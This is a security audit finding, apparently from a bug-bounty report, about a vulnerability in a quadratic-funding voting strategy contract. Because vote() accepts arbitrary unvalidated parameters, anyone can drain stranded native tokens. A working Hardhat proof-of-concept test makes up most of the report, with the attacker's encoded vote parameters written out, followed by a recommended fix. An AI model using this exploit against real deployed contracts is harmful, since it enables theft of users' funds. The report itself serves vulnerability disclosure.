# [H] - Any individual can drain out the native tokens from the voting strategy contract

## Summary

Any native tokens that reside in the voting strategy contract(QuadraticFundingVotingStrategyImplementation.sol) can be drained out.
Even though the Voting Strategy contract is not expected to hold any funds, but there is a possibility that this contract may hold funds due to incorrect inputs by user.
And if that happens, an attacker can simply execute the `vote()` with msg.value as 0 and with the following parameters encoded:-
```javascript
[
  ethers.constants.AddressZero, // specifying native token
  ethers.utils.parseEther("100"), // amount in the voting strategy contract
  attackerGrantAddress, // attacker controlled wallet
  attackerProjectID, // some project id
],
```
The above project doesn't actually exist or hasn't applied for this round. And since the vote() doesn't validate this, anyone can call the vote() with any parameters.
If 100 ether was present in the voting strategy contract, it will be drained by the attacker by executing the above transaction

## Vulnerability Detail

Here's a test to show that the above theory can be performed.
Please include the below test in the RoundImplementation.test.ts file under the `describe("test: vote")` block
Also add `anotherUser` and `attacker` to the `ethers.getSigners()` function

```javascript
it.only("Any individual can withdraw an arbitrary amount of native tokens from the voting strategy contract.", async () => {
        
        await ethers.provider.send("evm_mine", [_currentBlockTimestamp + 900]);

        let newEncodedVotes: BytesLike[] = [];

        await mockERC20.connect(anotherUser).mint(ethers.utils.parseEther("100"))
        await mockERC20.connect(anotherUser).approve(votingStrategyContract.address, ethers.utils.parseEther("100"))
        // a user wrongly votes with native tokens but he wanted to use erc20 token. 
        // This is just to show that funds can somehow end up in the voting strategy contract
        const votes = [
          [
            mockERC20.address,
            ethers.utils.parseEther("100"),
            Wallet.createRandom().address,
            formatBytes32String("SomeGrantThatApplied"),
          ],
        ];

        for (let i = 0; i < votes.length; i++) {
          newEncodedVotes.push(
            ethers.utils.defaultAbiCoder.encode(
              ["address", "uint256", "address", "bytes32"],
              votes[i]
            )
          );
        }

        // unknowingly sends ether
        await roundImplementation.connect(anotherUser).vote(newEncodedVotes, {value: ethers.utils.parseEther("100")})

        // The votingStrategyContract gets funded by mistake from anotherUser
        expect(await ethers.provider.getBalance(votingStrategyContract.address)).to.eq(ethers.utils.parseEther("100"));

        // An attacker finds funds in the contract and can call the vote() with a wallet address that he controls.
        let attackerEncodedVotes: BytesLike[] = [];
        // Project ID can be anything as the vote() does not check if the projectId is in existence or not.
        // So that means the vote function can be called with any parameters that you want as there are no input validation.
        let attackerProjectID = ethers.utils.hexlify(ethers.utils.randomBytes(32));
        // attacker controlled address
        const attackerGrantAddress = Wallet.createRandom().address;

        const attackerVotes = [
          [
            ethers.constants.AddressZero, // specifying native token
            ethers.utils.parseEther("100"), // amount
            attackerGrantAddress, // attacker controlled wallet
            attackerProjectID, // some project id
          ],
        ];

        for (let i = 0; i < attackerVotes.length; i++) {
          attackerEncodedVotes.push(
            ethers.utils.defaultAbiCoder.encode(
              ["address", "uint256", "address", "bytes32"],
              attackerVotes[i]
            )
          );
        }

        // attacker calls vote, but does not send any money of his own.
        await roundImplementation.connect(attacker).vote(attackerEncodedVotes, {value: 0})

        // attack successfull
        expect(await ethers.provider.getBalance(attackerGrantAddress)).to.eq(ethers.utils.parseEther("100"));
        expect(await ethers.provider.getBalance(votingStrategyContract.address)).to.eq(0);

      })
```

## Impact

Any funds residing in the QuadraticFundingVotingStrategyImplementation.sol contract can be drained.

## Tool used

Manual review, Hardhat

## Recommendation

Adding a check to see if the projectId actually exists before letting someone to vote would solve this issue to some extent.
